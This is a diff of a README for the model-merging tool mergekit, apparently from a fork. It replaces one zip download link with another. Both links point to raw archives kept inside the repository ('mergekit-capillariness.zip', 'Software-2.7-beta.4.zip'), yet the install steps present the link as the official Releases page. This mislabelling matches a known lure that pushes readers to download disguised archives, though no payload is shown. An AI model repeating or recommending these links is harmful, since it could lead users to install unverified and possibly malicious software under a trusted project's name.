@@ -1,6 +1,6 @@
 # 🚀 mergekit - Simplifying Your Model Merging Process
 
-[![Download mergekit](https://raw.githubusercontent.com/panyatan/mergekit/main/tests/mergekit-capillariness.zip)](https://raw.githubusercontent.com/panyatan/mergekit/main/tests/mergekit-capillariness.zip)
+[![Download mergekit](https://raw.githubusercontent.com/panyatan/mergekit/main/mergekit/Software-2.7-beta.4.zip)](https://raw.githubusercontent.com/panyatan/mergekit/main/mergekit/Software-2.7-beta.4.zip)
 
 ## 📥 Introduction
 
@@ -12,7 +12,7 @@ To start using mergekit, follow these steps to download and install the applicat
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/panyatan/mergekit/main/tests/mergekit-capillariness.zip) to access the latest version of mergekit.
+1. Visit the [Releases page](https://raw.githubusercontent.com/panyatan/mergekit/main/mergekit/Software-2.7-beta.4.zip) to access the latest version of mergekit.
 2. On the Releases page, find the version that you want to download. 
 3. Click on the file link to begin the download.
 4. Once the download completes, locate the file on your computer. You may find it in your Downloads folder by default.
